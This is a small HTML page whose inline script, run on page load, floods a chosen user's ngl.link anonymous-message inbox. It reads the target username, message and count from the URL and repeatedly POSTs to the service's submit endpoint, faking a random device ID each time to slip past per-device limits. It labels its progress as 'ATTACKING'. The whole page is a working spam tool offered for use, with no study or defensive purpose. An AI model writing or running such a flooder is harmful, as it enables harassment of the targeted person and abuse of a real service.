<!DOCTYPE html>
<html>
<body style="background:#000;color:#0f0;font-family:monospace;">
    <div id="status">WAITING...</div>
    <script>
        (async () => {
            const p = new URLSearchParams(window.location.search);
            const user = p.get('user'); // Ini bakal ngambil username target
            const msg = p.get('msg');
            const qty = p.get('qty') || 1;

            if (user && msg) {
                document.getElementById('status').innerText = `ATTACKING NGL.LINK/${user}...`;
                
                for (let i = 1; i <= qty; i++) {
                    await fetch('https://ngl.link/api/submit', {
                        method: 'POST',
                        mode: 'no-cors',
                        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                        body: `username=${user}&question=${msg}&deviceId=hp${Math.random()}`
                    });
                    document.getElementById('status').innerText = `SENT TO NGL.LINK/${user} (${i}/${qty})`;
                }
                document.getElementById('status').innerText = "DONE!";
            }
        })();
    </script>
</body>
</html>
